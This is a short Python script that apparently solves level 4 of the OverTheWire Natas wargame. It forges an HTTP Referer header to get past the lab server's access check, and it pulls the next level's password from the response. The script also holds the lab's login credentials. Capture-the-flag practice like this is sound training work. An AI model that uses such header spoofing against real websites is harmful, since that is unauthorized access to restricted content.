import requests
import re #regular expression

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org' % username

# Custom Headers headers = {"key" : "value"}

header = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }

# auth = (user,pass) HTTP Basic Auth

reponse = requests.get(url, auth = (username, password), headers = header)

content = reponse.text

#print(content)

print(re.findall('The password for natas5 is (.*)', content)[0])
